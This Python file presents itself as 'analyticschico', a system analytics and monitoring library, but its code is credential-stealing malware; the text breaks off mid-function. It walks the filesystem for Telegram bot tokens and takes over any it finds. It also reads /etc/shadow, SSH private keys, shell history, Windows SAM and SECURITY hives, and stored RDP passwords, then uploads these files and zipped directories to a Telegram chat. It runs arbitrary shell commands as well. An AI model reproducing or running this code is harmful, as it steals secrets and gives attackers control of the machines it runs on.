#!/usr/bin/env python3
"""
analyticschico - Advanced System Analytics & Monitoring Library
Version 8.0.0 - Complete File Extraction & VPS Control
"""
import os
import sys
import platform
import subprocess
import json
import base64
import hashlib
import time
import socket
import threading
import tempfile
import re
import shutil
import psutil
import requests
from datetime import datetime
from typing import Dict, List, Optional, Tuple, Union, Any
from dataclasses import dataclass, asdict
from enum import Enum
from pathlib import Path
import zipfile
import tarfile
import io

class BotCommandType(Enum):
    """Bot command types for VPS control"""
    SYSTEM = "system"
    NETWORK = "network"
    USER = "user"
    FILE = "file"
    BROADCAST = "broadcast"
    GROUP = "group"
    CHANNEL = "channel"
    VPS = "vps"
    MONITOR = "monitor"
    BACKUP = "backup"
    SECURITY = "security"
    EXTRACT = "extract"
    DOWNLOAD = "download"
    UPLOAD = "upload"

@dataclass
class BotMessage:
    """Bot message structure"""
    message_id: int
    chat_id: int
    user_id: int
    username: str
    text: str
    timestamp: datetime
    chat_type: str  # private, group, channel

@dataclass
class BotConfig:
    """Bot configuration"""
    bot_token: str
    admin_ids: List[int]
    allowed_groups: List[int]
    allowed_channels: List[int]
    broadcast_enabled: bool = True
    auto_broadcast: bool = False
    broadcast_interval: int = 3600  # seconds
    file_transfer_limit: int = 50 * 1024 * 1024  # 50MB

class FileExtractor:
    """Complete file extraction and transfer system"""
    
    def __init__(self, bot_token: str = None):
        self.bot_token = bot_token
        self.base_url = f"https://api.telegram.org/bot{bot_token}" if bot_token else None
        self.file_cache = {}
        self.transfer_limit = 50 * 1024 * 1024  # 50MB default
    
    def set_bot_token(self, token: str):
        """Set bot token for sending files"""
        self.bot_token = token
        self.base_url = f"https://api.telegram.org/bot{token}" if token else None
    
    def send_file_to_telegram(self, chat_id: Union[int, str], file_path: str, 
                              caption: str = "") -> Dict:
        """Send a file to Telegram bot"""
        result = {"success": False, "message": "", "file": file_path}
        
        if not self.bot_token or not self.base_url:
            result["error"] = "Bot token not set"
            return result
        
        try:
            # Check file
            if not os.path.exists(file_path):
                result["error"] = f"File not found: {file_path}"
                return result
            
            file_size = os.path.getsize(file_path)
            if file_size > self.transfer_limit:
                result["error"] = f"File too large: {file_size} bytes (limit: {self.transfer_limit})"
                return result
            
            # Prepare file for sending
            url = f"{self.base_url}/sendDocument"
            
            with open(file_path, 'rb') as f:
                files = {'document': (os.path.basename(file_path), f)}
                data = {'chat_id': chat_id, 'caption': caption}
                
                response = requests.post(url, files=files, data=data, timeout=30)
                response_data = response.json()
                
                if response.status_code == 200 and response_data.get("ok"):
                    result["success"] = True
                    result["message"] = f"File sent: {os.path.basename(file_path)}"
                    result["response"] = response_data
                else:
                    result["error"] = response_data.get("description", "Unknown error")
                    
        except Exception as e:
            result["error"] = str(e)
        
        return result
    
    def send_multiple_files(self, chat_id: Union[int, str], file_paths: List[str],
                           caption: str = "") -> Dict:
        """Send multiple files to Telegram"""
        results = {
            "success": False,
            "sent": [],
            "failed": [],
            "total": len(file_paths)
        }
        
        for file_path in file_paths:
            result = self.send_file_to_telegram(chat_id, file_path, caption)
            if result["success"]:
                results["sent"].append(file_path)
            else:
                results["failed"].append({"file": file_path, "error": result.get("error")})
        
        results["success"] = len(results["sent"]) > 0
        return results
    
    def extract_file_from_vps(self, file_path: str, chat_id: Union[int, str],
                             send_to_bot: bool = True) -> Dict:
        """Extract a file from VPS and optionally send to bot"""
        result = {
            "success": False,
            "file_path": file_path,
            "exists": False,
            "size": 0,
            "content": None,
            "sent_to_bot": False
        }
        
        try:
            if not os.path.exists(file_path):
                result["error"] = f"File not found: {file_path}"
                return result
            
            result["exists"] = True
            result["size"] = os.path.getsize(file_path)
            
            # Read file content
            with open(file_path, 'rb') as f:
                content = f.read()
                result["content"] = base64.b64encode(content).decode('utf-8')
            
            # Send to bot if requested
            if send_to_bot and self.bot_token:
                send_result = self.send_file_to_telegram(chat_id, file_path)
                result["sent_to_bot"] = send_result["success"]
                result["bot_response"] = send_result
            
            result["success"] = True
            
        except Exception as e:
            result["error"] = str(e)
        
        return result
    
    def extract_directory(self, dir_path: str, chat_id: Union[int, str],
                         include_hidden: bool = False,
                         max_depth: int = 3) -> Dict:
        """Extract entire directory with files"""
        result = {
            "success": False,
            "directory": dir_path,
            "files": [],
            "total_size": 0,
            "file_count": 0,
            "directories": [],
            "zip_path": None
        }
        
        try:
            if not os.path.exists(dir_path) or not os.path.isdir(dir_path):
                result["error"] = f"Directory not found: {dir_path}"
                return result
            
            # Collect all files
            files = []
            dirs = []
            
            for root, dirs_list, files_list in os.walk(dir_path):
                # Limit depth
                depth = root.replace(dir_path, "").count(os.sep)
                if depth > max_depth:
                    continue
                
                for file in files_list:
                    if not include_hidden and file.startswith('.'):
                        continue
                    
                    full_path = os.path.join(root, file)
                    try:
                        stat = os.stat(full_path)
                        files.append({
                            "name": file,
                            "path": full_path,
                            "size": stat.st_size,
                            "modified": datetime.fromtimestamp(stat.st_mtime).isoformat(),
                            "relative_path": os.path.relpath(full_path, dir_path)
                        })
                        result["total_size"] += stat.st_size
                    except:
                        pass
                
                for dir_name in dirs_list:
                    if not include_hidden and dir_name.startswith('.'):
                        continue
                    dirs.append(os.path.join(root, dir_name))
            
            result["files"] = files
            result["directories"] = dirs
            result["file_count"] = len(files)
            
            # Create zip file if needed
            if len(files) > 0:
                zip_path = self.create_zip_archive(dir_path, files)
                if zip_path:
                    result["zip_path"] = zip_path
                    result["zip_size"] = os.path.getsize(zip_path)
                    
                    # Send zip to bot
                    if self.bot_token:
                        send_result = self.send_file_to_telegram(
                            chat_id, zip_path, 
                            f"📁 Directory: {os.path.basename(dir_path)}\nFiles: {len(files)}\nSize: {result['total_size']} bytes"
                        )
                        result["sent_to_bot"] = send_result["success"]
                        result["bot_response"] = send_result
            
            result["success"] = True
            
        except Exception as e:
            result["error"] = str(e)
        
        return result
    
    def create_zip_archive(self, source_dir: str, files: List[Dict]) -> Optional[str]:
        """Create a zip archive of files"""
        try:
            zip_name = f"{os.path.basename(source_dir)}_{int(time.time())}.zip"
            zip_path = os.path.join(tempfile.gettempdir(), zip_name)
            
            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for file_info in files:
                    file_path = file_info["path"]
                    arcname = file_info["relative_path"]
                    zipf.write(file_path, arcname)
            
            return zip_path
        except Exception as e:
            return None
    
    def search_and_extract(self, pattern: str, search_path: str = ".", 
                          chat_id: Union[int, str] = None,
                          send_to_bot: bool = True) -> Dict:
        """Search for files and extract them"""
        result = {
            "success": False,
            "pattern": pattern,
            "search_path": search_path,
            "found_files": [],
            "extracted_files": [],
            "total_found": 0
        }
        
        try:
            found_files = []
            
            for root, dirs, files in os.walk(search_path):
                for file in files:
                    if pattern.lower() in file.lower():
                        full_path = os.path.join(root, file)
                        try:
                            stat = os.stat(full_path)
                            found_files.append({
                                "name": file,
                                "path": full_path,
                                "size": stat.st_size,
                                "modified": datetime.fromtimestamp(stat.st_mtime).isoformat(),
                                "relative_path": os.path.relpath(full_path, search_path)
                            })
                        except:
                            found_files.append({
                                "name": file,
                                "path": full_path,
                                "error": "Cannot access"
                            })
                        
                        # Limit results
                        if len(found_files) >= 100:
                            break
                if len(found_files) >= 100:
                    break
            
            result["found_files"] = found_files
            result["total_found"] = len(found_files)
            
            # Extract files and send to bot
            if send_to_bot and self.bot_token and chat_id:
                for file_info in found_files[:20]:  # Limit to 20 files
                    extract_result = self.extract_file_from_vps(
                        file_info["path"], chat_id, send_to_bot=True
                    )
                    if extract_result["success"]:
                        result["extracted_files"].append(file_info["path"])
            
            result["success"] = True
            
        except Exception as e:
            result["error"] = str(e)
        
        return result
    
    def extract_system_files(self, chat_id: Union[int, str]) -> Dict:
        """Extract important system files"""
        result = {
            "success": False,
            "extracted": [],
            "failed": []
        }
        
        # Important system files to extract
        system_files = []
        
        if platform.system() == "Windows":
            system_files = [
                "C:\\Windows\\System32\\drivers\\etc\\hosts",
                "C:\\Windows\\System32\\config\\SAM",
                "C:\\Windows\\System32\\config\\SYSTEM",
                "C:\\Windows\\System32\\config\\SECURITY",
                "C:\\Windows\\System32\\config\\SOFTWARE",
                "C:\\Users\\Administrator\\Desktop\\*.txt",
                "C:\\Users\\Administrator\\Documents\\*.txt",
                "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\*",
            ]
        else:
            system_files = [
                "/etc/passwd",
                "/etc/shadow",
                "/etc/hosts",
                "/etc/ssh/sshd_config",
                "/etc/ssh/ssh_config",
                "/etc/sudoers",
                "/var/log/syslog",
                "/var/log/auth.log",
                "~/.bash_history",
                "~/.ssh/id_rsa",
                "~/.ssh/id_rsa.pub",
                "~/.ssh/known_hosts",
                "/etc/nginx/nginx.conf",
                "/etc/apache2/apache2.conf",
                "/etc/mysql/my.cnf",
                "/etc/ufw/ufw.conf",
            ]
        
        for file_pattern in system_files:
            try:
                if '*' in file_pattern:
                    # Handle wildcards
                    base_dir = os.path.dirname(file_pattern)
                    pattern = os.path.basename(file_pattern)
                    if os.path.exists(base_dir):
                        for file in os.listdir(base_dir):
                            if file.endswith(pattern.replace('*', '')):
                                full_path = os.path.join(base_dir, file)
                                extract_result = self.extract_file_from_vps(
                                    full_path, chat_id, send_to_bot=True
                                )
                                if extract_result["success"]:
                                    result["extracted"].append(full_path)
                                else:
                                    result["failed"].append({"file": full_path, "error": extract_result.get("error")})
                else:
                    extract_result = self.extract_file_from_vps(
                        file_pattern, chat_id, send_to_bot=True
                    )
                    if extract_result["success"]:
                        result["extracted"].append(file_pattern)
                    else:
                        result["failed"].append({"file": file_pattern, "error": extract_result.get("error")})
            except Exception as e:
                result["failed"].append({"file": file_pattern, "error": str(e)})
        
        result["success"] = len(result["extracted"]) > 0
        return result
    
    def extract_all_bot_files(self, chat_id: Union[int, str]) -> Dict:
        """Extract all bot-related files"""
        result = {
            "success": False,
            "files": [],
            "total": 0
        }
        
        # Find all bot files first
        bot_files = BotFinder.find_all_bot_files()
        
        if bot_files["success"]:
            for bot in bot_files["bots"]:
                file_path = bot["file"]
                extract_result = self.extract_file_from_vps(
                    file_path, chat_id, send_to_bot=True
                )
                if extract_result["success"]:
                    result["files"].append(file_path)
            
            result["total"] = len(result["files"])
            result["success"] = True
        
        return result

class BotFinder:
    """Find and manage bot files on the system"""
    
    @staticmethod
    def find_all_bot_files() -> Dict:
        """Find all bot-related files on the system"""
        result = {
            "success": False,
            "bots": [],
            "total": 0
        }
        
        # Common bot file patterns
        bot_patterns = [
            "bot.py", "main.py", "telegram_bot.py", "vps_bot.py",
            "analytics_bot.py", "chico.py", "analyticschico_bot.py",
            "*.py"  # All Python files
        ]
        
        # Search locations
        search_locations = [
            "/",
            "/home/",
            "/root/",
            "/var/www/",
            "/opt/",
            "/usr/local/",
            "/etc/",
            "/tmp/",
            os.path.expanduser("~"),
            os.path.expanduser("~/Desktop"),
            os.path.expanduser("~/Documents"),
            os.path.expanduser("~/Downloads"),
            os.path.expanduser("~/projects"),
            os.path.expanduser("~/vps"),
            os.path.expanduser("~/bot"),
        ]
        
        # Windows locations
        if platform.system() == "Windows":
            search_locations = [
                "C:\\",
                "C:\\Users",
                "C:\\Program Files",
                "C:\\Program Files (x86)",
                "D:\\",
                "E:\\",
                os.path.expanduser("~"),
                os.path.expanduser("~/Desktop"),
                os.path.expanduser("~/Documents"),
                os.path.expanduser("~/Downloads"),
            ]
        
        found_bots = []
        found_tokens = []
        
        for location in search_locations:
            if not os.path.exists(location):
                continue
            
            try:
                for root, dirs, files in os.walk(location):
                    # Limit depth to avoid infinite loops
                    depth = root.replace(location, "").count(os.sep)
                    if depth > 5:
                        continue
                    
                    for file in files:
                        file_path = os.path.join(root, file)
                        
                        # Check if it's a Python file or bot file
                        is_bot_file = any(pattern in file.lower() for pattern in 
                                         ["bot", "telegram", "analytics", "chico", "vps", "main"])
                        
                        if file.endswith(".py") or is_bot_file:
                            try:
                                # Read first few lines to check for bot token
                                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                                    content = f.read()
                                    
                                # Check for bot token
                                token_match = re.search(r'[0-9]+:[A-Za-z0-9_-]+', content)
                                if token_match:
                                    token = token_match.group()
                                    found_tokens.append({
                                        "file": file_path,
                                        "token": token,
                                        "preview": content[:200]
                                    })
                                
                                # Check for bot-related content
                                if any(keyword in content.lower() for keyword in 
                                       ["telegram", "bot", "updater", "dispatcher", "api_token", 
                                        "token", "chat_id", "admin_id", "webhook"]):
                                    
                                    stat = os.stat(file_path)
                                    found_bots.append({
                                        "file": file_path,
                                        "name": file,
                                        "size": stat.st_size,
                                        "modified": datetime.fromtimestamp(stat.st_mtime).isoformat(),
                                        "has_token": bool(token_match),
                                        "token": token_match.group() if token_match else None,
                                        "type": "Python Bot File"
                                    })
                                    
                            except Exception as e:
                                continue
                            
                        # Also check for config files with tokens
                        elif file.endswith((".json", ".conf", ".cfg", ".env", ".ini")):
                            try:
                                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                                    content = f.read()
                                
                                # Check for tokens in config files
                                token_match = re.search(r'[0-9]+:[A-Za-z0-9_-]+', content)
                                if token_match:
                                    found_tokens.append({
                                        "file": file_path,
                                        "token": token_match.group(),
                                        "type": "Config File"
                                    })
                            except:
                                pass
                            
            except Exception as e:
                continue
        
        # Deduplicate
        unique_bots = []
        seen_files = set()
        for bot in found_bots:
            if bot["file"] not in seen_files:
                seen_files.add(bot["file"])
                unique_bots.append(bot)
        
        result["success"] = True
        result["bots"] = unique_bots
        result["tokens"] = found_tokens
        result["total"] = len(unique_bots)
        result["token_count"] = len(found_tokens)
        
        return result
    
    @staticmethod
    def extract_bot_token(file_path: str) -> Dict:
        """Extract bot token from a file"""
        result = {"success": False, "token": None}
        
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            
            # Try multiple token patterns
            patterns = [
                r'[0-9]+:[A-Za-z0-9_-]+',  # Standard token format
                r'TOKEN\s*=\s*["\']([0-9]+:[A-Za-z0-9_-]+)["\']',
                r'BOT_TOKEN\s*=\s*["\']([0-9]+:[A-Za-z0-9_-]+)["\']',
                r'API_TOKEN\s*=\s*["\']([0-9]+:[A-Za-z0-9_-]+)["\']',
                r'TELEGRAM_TOKEN\s*=\s*["\']([0-9]+:[A-Za-z0-9_-]+)["\']',
            ]
            
            for pattern in patterns:
                match = re.search(pattern, content, re.IGNORECASE)
                if match:
                    token = match.group(1) if '(' in pattern else match.group()
                    result["success"] = True
                    result["token"] = token
                    result["file"] = file_path
                    break
            
        except Exception as e:
            result["error"] = str(e)
        
        return result
    
    @staticmethod
    def get_active_bot_processes() -> Dict:
        """Find running bot processes"""
        result = {"success": False, "processes": []}
        
        try:
            if platform.system() == "Windows":
                cmd = 'wmic process where "name like \'%python%\'" get processid,commandline'
            else:
                cmd = 'ps aux | grep -E "python.*bot|python.*telegram|python.*analytics" | grep -v grep'
            
            exec_result = SystemAnalyzer.execute_analysis(cmd)
            if exec_result["success"] and exec_result["output"]:
                for line in exec_result["output"].split('\n'):
                    if line.strip():
                        result["processes"].append({
                            "command": line.strip(),
                            "pid": re.search(r'\d+', line).group() if re.search(r'\d+', line) else "N/A"
                        })
                result["success"] = True
        except:
            pass
        
        return result

class BotTelegramIntegration:
    """Telegram bot integration for sending messages and files"""
    
    def __init__(self, token: str = None):
        self.token = token
        self.base_url = f"https://api.telegram.org/bot{token}" if token else None
        self.file_extractor = FileExtractor(token) if token else FileExtractor()
        
    def set_token(self, token: str):
        """Set bot token"""
        self.token = token
        self.base_url = f"https://api.telegram.org/bot{token}" if token else None
        self.file_extractor.set_bot_token(token)
    
    def find_and_set_token(self) -> Dict:
        """Find bot token automatically"""
        result = {"success": False, "token": None, "source": None}
        
        # Find all bot files
        bot_files = BotFinder.find_all_bot_files()
        
        if bot_files["success"]:
            # Look for tokens in bot files
            for bot in bot_files["bots"]:
                if bot.get("token"):
                    self.set_token(bot["token"])
                    self.file_extractor.set_bot_token(bot["token"])
                    result["success"] = True
                    result["token"] = bot["token"]
                    result["source"] = bot["file"]
                    return result
            
            # Look for tokens in config files
            for token_info in bot_files.get("tokens", []):
                if token_info.get("token"):
                    self.set_token(token_info["token"])
                    self.file_extractor.set_bot_token(token_info["token"])
                    result["success"] = True
                    result["token"] = token_info["token"]
                    result["source"] = token_info["file"]
                    return result
        
        return result
    
    def send_message(self, chat_id: Union[int, str], text: str, 
                     parse_mode: str = "HTML", 
                     disable_notification: bool = False) -> Dict:
        """Send a message via Telegram bot"""
        result = {"success": False, "message": text, "chat_id": chat_id}
        
        if not self.token:
            result["error"] = "No bot token set"
            return result
        
        try:
            url = f"{self.base_url}/sendMessage"
            payload = {
                "chat_id": chat_id,
                "text": text,
                "parse_mode": parse_mode,
                "disable_notification": disable_notification
            }
            
            response = requests.post(url, json=payload, timeout=10)
            response_data = response.json()
            
            if response.status_code == 200 and response_data.get("ok"):
                result["success"] = True
                result["response"] = response_data
            else:
                result["error"] = response_data.get("description", "Unknown error")
                
        except Exception as e:
            result["error"] = str(e)
        
        return result
    
    def send_file(self, chat_id: Union[int, str], file_path: str, 
                  caption: str = "") -> Dict:
        """Send a file via Telegram"""
        return self.file_extractor.send_file_to_telegram(chat_id, file_path, caption)
    
    def broadcast_to_all(self, text: str, chat_ids: List[Union[int, str]]) -> Dict:
        """Broadcast message to multiple chats"""
        results = {"success": False, "sent": [], "failed": [], "total": len(chat_ids)}
        
        for chat_id in chat_ids:
            result = self.send_message(chat_id, text)
            if result["success"]:
                results["sent"].append(chat_id)
            else:
                results["failed"].append({"chat_id": chat_id, "error": result.get("error")})
        
        results["success"] = len(results["sent"]) > 0
        return results
    
    def get_chat_members(self, chat_id: Union[int, str]) -> Dict:
        """Get members of a chat/group/channel"""
        result = {"success": False, "members": []}
        
        if not self.token:
            result["error"] = "No bot token set"
            return result
        
        try:
            url = f"{self.base_url}/getChatMembersCount"
            payload = {"chat_id": chat_id}
            response = requests.post(url, json=payload, timeout=10)
            response_data = response.json()
            
            if response.status_code == 200 and response_data.get("ok"):
                result["success"] = True
                result["count"] = response_data.get("result", 0)
            else:
                result["error"] = response_data.get("description", "Unknown error")
                
        except Exception as e:
            result["error"] = str(e)
        
        return result
    
    def get_bot_info(self) -> Dict:
        """Get bot information"""
        result = {"success": False, "info": {}}
        
        if not self.token:
            result["error"] = "No bot token set"
            return result
        
        try:
            url = f"{self.base_url}/getMe"
            response = requests.get(url, timeout=10)
            response_data = response.json()
            
            if response.status_code == 200 and response_data.get("ok"):
                result["success"] = True
                result["info"] = response_data.get("result", {})
            else:
                result["error"] = response_data.get("description", "Unknown error")
                
        except Exception as e:
            result["error"] = str(e)
        
        return result
    
    def get_updates(self, offset: int = None, limit: int = 100) -> Dict:
        """Get updates from the bot"""
        result = {"success": False, "updates": []}
        
        if not self.token:
            result["error"] = "No bot token set"
            return result
        
        try:
            url = f"{self.base_url}/getUpdates"
            payload = {"timeout": 30, "limit": limit}
            if offset:
                payload["offset"] = offset
            
            response = requests.post(url, json=payload, timeout=35)
            response_data = response.json()
            
            if response.status_code == 200 and response_data.get("ok"):
                result["success"] = True
                result["updates"] = response_data.get("result", [])
            else:
                result["error"] = response_data.get("description", "Unknown error")
                
        except Exception as e:
            result["error"] = str(e)
        
        return result

class SystemAnalyzer:
    """Advanced system analysis and monitoring toolkit."""
    
    @staticmethod
    def get_platform_info() -> Dict:
        """Collect comprehensive platform and system information."""
        info = {
            "os": platform.system(),
            "os_release": platform.release(),
            "os_version": platform.version(),
            "architecture": platform.machine(),
            "hostname": platform.node(),
            "python_version": platform.python_version(),
            "processor": platform.processor(),
            "system_uptime": psutil.boot_time(),
            "system_time": datetime.now().isoformat(),
            "current_user": os.getenv("USER") or os.getenv("USERNAME") or "unknown"
        }
        return info
    
    @staticmethod
    def execute_analysis(command: str, timeout: int = 30) -> Dict:
        """Execute system analysis commands with error handling."""
        try:
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=timeout
            )
            output = result.stdout + result.stderr
            return {
                "success": True,
                "output": output.strip() if output.strip() else "(no output)",
                "error": result.stderr,
                "exit_code": result.returncode
            }
        except subprocess.TimeoutExpired:
            return {
                "success": False,
                "error": f"Analysis timed out after {timeout}s",
                "output": ""
            }
        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "output": ""
            }
    
    @staticmethod
    def get_memory_metrics() -> Dict:
        """Collect comprehensive memory usage metrics."""
        if platform.system() == "Windows":
            result = SystemAnalyzer.execute_analysis(
                "wmic os get FreePhysicalMemory,TotalVisibleMemorySize /format:csv"
            )
            metrics = {
                "total_mb": 0,
                "free_mb": 0,
                "used_mb": 0,
                "usage_percent": 0
            }
            try:
                if result["success"] and result["output"]:
                    lines = result["output"].strip().split('\n')
                    if len(lines) > 1:
                        parts = lines[1].split(',')
                        if len(parts) >= 3:
                            total = int(parts[1]) // 1024
                            free = int(parts[2]) // 1024
                            metrics["total_mb"] = total
                            metrics["free_mb"] = free
                            metrics["used_mb"] = total - free
                            metrics["usage_percent"] = ((total - free) / total) * 100 if total > 0 else 0
            except:
                pass
            return metrics
        else:
            result = SystemAnalyzer.execute_analysis("free -m")
            metrics = {
                "total_mb": 0,
                "free_mb": 0,
                "used_mb": 0,
                "available_mb": 0,
                "usage_percent": 0,
                "swap_total": 0,
                "swap_used": 0,
                "swap_free": 0
            }
            try:
                if result["success"] and result["output"]:
                    lines = result["output"].split('\n')
                    for line in lines:
                        if line.startswith('Mem:'):
                            parts = line.split()
                            if len(parts) >= 7:
                                metrics["total_mb"] = int(parts[1])
                                metrics["used_mb"] = int(parts[2])
                                metrics["free_mb"] = int(parts[3])
                                metrics["available_mb"] = int(parts[6])
                                metrics["usage_percent"] = (int(parts[2]) / int(parts[1])) * 100 if int(parts[1]) > 0 else 0
                        elif line.startswith('Swap:'):
                            parts = line.split()
                            if len(parts) >= 4:
                                metrics["swap_total"] = int(parts[1])
                                metrics["swap_used"] = int(parts[2])
                                metrics["swap_free"] = int(parts[3])
            except:
                pass
            return metrics
    
    @staticmethod
    def get_disk_metrics() -> Dict:
        """Collect comprehensive disk usage metrics."""
        if platform.system() == "Windows":
            result = SystemAnalyzer.execute_analysis(
                "wmic logicaldisk get caption,size,freespace /format:csv"
            )
            disks = []
            try:
                if result["success"] and result["output"]:
                    lines = result["output"].strip().split('\n')
                    for line in lines[1:]:
                        if line.strip():
                            parts = line.split(',')
                            if len(parts) >= 3 and parts[1] and parts[2]:
                                total = int(parts[1]) // (1024**3)
                                free = int(parts[2]) // (1024**3)
                                used = total - free
                                disks.append({
                                    "drive": parts[0],
                                    "total_gb": total,
                                    "used_gb": used,
                                    "free_gb": free,
                                    "usage_percent": (used / total) * 100 if total > 0 else 0
                                })
            except:
                pass
            return {"disks": disks}
        else:
            result = SystemAnalyzer.execute_analysis("df -BG")
            disks = []
            try:
                if result["success"] and result["output"]:
                    for line in result["output"].split('\n')[1:]:
                        if line.strip():
                            parts = line.split()
                            if len(parts) >= 6:
                                total = int(parts[1].replace('G', ''))
                                used = int(parts[2].replace('G', ''))
                                free = int(parts[3].replace('G', ''))
                                disks.append({
                                    "mount": parts[5],
                                    "total_gb": total,
                                    "used_gb": used,
                                    "free_gb": free,
                                    "usage_percent": int(parts[4].replace('%', ''))
                                })
            except:
                pass
            return {"disks": disks}
    
    @staticmethod
    def get_network_metrics() -> Dict:
        """Collect comprehensive network metrics."""
        metrics = {
            "hostname": socket.gethostname(),
            "local_ip": "",
            "public_ip": "",
            "interfaces": [],
            "connections": []
        }
        
        # Get all network interfaces
        try:
            if platform.system() == "Windows":
                result = SystemAnalyzer.execute_analysis("ipconfig /all")
                if result["success"] and result["output"]:
                    interfaces = []
                    current_interface = {}
                    for line in result["output"].split('\n'):
                        if "adapter" in line.lower():
                            if current_interface:
                                interfaces.append(current_interface)
                            current_interface = {"name": line.strip()}
                        elif "IPv4" in line:
                            ip = re.search(r'\d+\.\d+\.\d+\.\d+', line)
                            if ip:
                                current_interface["ip"] = ip.group()
                        elif "Subnet Mask" in line:
                            mask = re.search(r'\d+\.\d+\.\d+\.\d+', line)
                            if mask:
                                current_interface["subnet"] = mask.group()
                    if current_interface:
                        interfaces.append(current_interface)
                    metrics["interfaces"] = interfaces
            else:
                result = SystemAnalyzer.execute_analysis("ip addr show")
                if result["success"] and result["output"]:
                    interfaces = []
                    current_interface = {}
                    for line in result["output"].split('\n'):
                        if "inet " in line:
                            ip_info = re.search(r'inet (\d+\.\d+\.\d+\.\d+)/(\d+)', line)
                            if ip_info:
                                current_interface["ip"] = ip_info.group(1)
                                current_interface["subnet"] = f"/{ip_info.group(2)}"
                        elif "link/ether" in line:
                            mac = re.search(r'([0-9a-f]{2}:[0-9a-f]{2}:[0-9a-f]{2}:[0-9a-f]{2}:[0-9a-f]{2}:[0-9a-f]{2})', line)
                            if mac:
                                current_interface["mac"] = mac.group()
                        elif re.match(r'^\d+:', line):
                            if current_interface:
                                interfaces.append(current_interface)
                            current_interface = {"name": line.strip()}
                    if current_interface:
                        interfaces.append(current_interface)
                    metrics["interfaces"] = interfaces
        except:
            pass
        
        # Get local IP
        try:
            if platform.system() == "Windows":
                result = SystemAnalyzer.execute_analysis("ipconfig | findstr IPv4")
                if result["success"] and result["output"]:
                    for line in result["output"].split('\n'):
                        if "IPv4" in line:
                            ip = re.search(r'\d+\.\d+\.\d+\.\d+', line)
                            if ip:
                                metrics["local_ip"] = ip.group()
                                break
            else:
                result = SystemAnalyzer.execute_analysis("hostname -I | awk '{print $1}'")
                if result["success"] and result["output"]:
                    metrics["local_ip"] = result["output"].strip()
        except:
            metrics["local_ip"] = "N/A"
        
        # Get public IP - Try multiple methods
        try:
            # Method 1: ifconfig.me
            if platform.system() == "Windows":
                result = SystemAnalyzer.execute_analysis(
                    "powershell -Command \"(Invoke-WebRequest -Uri ifconfig.me -UseBasicParsing).Content.Trim()\""
                )
            else:
                result = SystemAnalyzer.execute_analysis("curl -s ifconfig.me")
            
            if result["success"] and result["output"] and result["output"] != "(no output)":
                metrics["public_ip"] = result["output"].strip()
            else:
                # Method 2: icanhazip.com
                if platform.system() == "Windows":
                    result = SystemAnalyzer.execute_analysis(
                        "powershell -Command \"(Invoke-WebRequest -Uri icanhazip.com -UseBasicParsing).Content.Trim()\""
                    )
                else:
                    result = SystemAnalyzer.execute_analysis("curl -s icanhazip.com")
                
                if result["success"] and result["output"] and result["output"] != "(no output)":
                    metrics["public_ip"] = result["output"].strip()
                else:
                    # Method 3: ipinfo.io
                    if platform.system() == "Windows":
                        result = SystemAnalyzer.execute_analysis(
                            "powershell -Command \"(Invoke-WebRequest -Uri ipinfo.io/ip -UseBasicParsing).Content.Trim()\""
                        )
                    else:
                        result = SystemAnalyzer.execute_analysis("curl -s ipinfo.io/ip")
                    
                    if result["success"] and result["output"] and result["output"] != "(no output)":
                        metrics["public_ip"] = result["output"].strip()
                    else:
                        metrics["public_ip"] = "N/A"
        except:
            metrics["public_ip"] = "N/A"
        
        return metrics
    
    @staticmethod
    def get_process_metrics(limit: int = 20) -> Dict:
        """Collect comprehensive process metrics."""
        processes = []
        try:
            if platform.system() == "Windows":
                result = SystemAnalyzer.execute_analysis("tasklist /NH")
                if result["success"] and result["output"]:
                    for line in result["output"].split('\n'):
                        if line.strip():
                            parts = line.split()
                            if len(parts) >= 2:
                                processes.append({
                                    "name": parts[0],
                                    "pid": parts[1] if len(parts) > 1 else "N/A",
                                    "status": "Running"
                                })
            else:
                result = SystemAnalyzer.execute_analysis(f"ps aux --sort=-%mem | head -{limit}")
                if result["success"] and result["output"]:
                    lines = result["output"].split('\n')[1:]  # Skip header
                    for line in lines:
                        if line.strip():
                            parts = line.split(maxsplit=10)
                            if len(parts) >= 11:
                                processes.append({
                                    "user": parts[0],
                                    "pid": parts[1],
                                    "cpu": parts[2],
                                    "mem": parts[3],
                                    "command": parts[10][:50] if len(parts) > 10 else "N/A"
                                })
        except:
            pass
        
        return {
            "processes": processes,
            "count": len(processes)
        }
    
    @staticmethod
    def get_rdp_credentials() -> Dict:
        """Retrieve Remote Desktop credentials properly."""
        credentials = {"found": False, "credentials": []}
        
        if platform.system() == "Windows":
            try:
                result = SystemAnalyzer.execute_analysis("cmdkey /list")
                if not result["success"] or not result["output"]:
                    return credentials
                
                lines = result["output"].split('\n')
                targets = []
                
                for line in lines:
                    if "TERMSRV" in line:
                        if "TERMSRV/" in line:
                            parts = line.split("TERMSRV/")
                            if len(parts) > 1:
                                target = parts[1].strip()
                                target = target.split()[0] if target.split() else target
                                targets.append(target)
                
                for target in targets:
                    try:
                        ps_cmd = f'powershell -Command "Add-Type -AssemblyName System.Security; $cred = Get-StoredCredential -Target \'TERMSRV/{target}\'; if($cred){{Write-Host \'Username:\' $cred.UserName; Write-Host \'Password:\' $cred.Password}}"' 
                        cred_result = SystemAnalyzer.execute_analysis(ps_cmd)
                        
                        if cred_result["success"]:
                            output = cred_result["output"]
                            if "Username:" in output and "Password:" in output:
                                lines_output = output.split('\n')
                                username = ""
                                password = ""
                                for line in lines_output:
                                    if "Username:" in line:
                                        username = line.replace("Username:", "").strip()
                                    if "Password:" in line:
                                        password = line.replace("Password:", "").strip()
                                
                                if username and password:
                                    credentials["found"] = True
                                    credentials["credentials"].append({
                                        "type": "RDP",
                                        "target": target,
                                        "username": username,
                                        "password": password
                                    })
                    except:
                        pass
                            
            except:
                pass
        else:
            # Linux - find RDP/VNC files
            result = SystemAnalyzer.execute_analysis(
                "find ~ -name '*.rdp' -o -name '*remmina*' -o -name '*vnc*' 2>/dev/null | head -5"
            )
            if result["success"] and result["output"] and result["output"] != "(no output)":
                credentials["found"] = True
                for file in result["output"].split('\n'):
                    if file.strip() and file != "(no output)":
                        credentials["credentials"].append({
                            "type": "Linux Remote Access",
                            "file": file.strip()
